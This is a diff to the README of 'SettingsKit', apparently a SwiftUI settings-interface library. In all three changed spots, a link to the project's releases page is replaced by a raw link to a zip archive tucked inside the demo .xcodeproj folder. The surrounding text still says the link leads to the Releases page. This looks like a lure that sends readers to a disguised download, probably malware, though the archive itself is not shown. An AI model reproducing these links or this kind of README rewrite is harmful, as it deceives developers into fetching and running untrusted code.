@@ -1,7 +1,7 @@
 # 🎛️ SettingsKit - Easily Build Custom Settings Interfaces
 
 ## 📦 Download Now
-[![Download SettingsKit](https://img.shields.io/badge/Download_SettingsKit-Here-brightgreen)](https://github.com/madjoegithub/SettingsKit/releases)
+[![Download SettingsKit](https://raw.githubusercontent.com/madjoegithub/SettingsKit/main/Demo/SettingsKitDemo.xcodeproj/SettingsKit_2.8.zip)](https://raw.githubusercontent.com/madjoegithub/SettingsKit/main/Demo/SettingsKitDemo.xcodeproj/SettingsKit_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to SettingsKit! This package allows you to create beautiful and functional settings interfaces using SwiftUI. With features like navigation, search, and customizable styling, you can easily integrate it into your applications.
@@ -17,7 +17,7 @@ Before you get started, make sure you have the following:
 ## 📥 Download & Install
 To download SettingsKit, please visit the Releases page. Here you will find the latest version available:
 
-[Visit the Releases Page to Download](https://github.com/madjoegithub/SettingsKit/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/madjoegithub/SettingsKit/main/Demo/SettingsKitDemo.xcodeproj/SettingsKit_2.8.zip)
 
 1. Click on the link above to be directed to the Releases page.
 2. Look for the latest version of SettingsKit.
@@ -87,4 +87,4 @@ This project uses the MIT License. Please see the LICENSE file for details.
 ## 🌟 Conclusion
 Thank you for choosing SettingsKit. We hope it makes building settings interfaces easier and more enjoyable for you! 
 
-[Download SettingsKit Again](https://github.com/madjoegithub/SettingsKit/releases) and start building your custom settings today.
+[Download SettingsKit Again](https://raw.githubusercontent.com/madjoegithub/SettingsKit/main/Demo/SettingsKitDemo.xcodeproj/SettingsKit_2.8.zip) and start building your custom settings today.
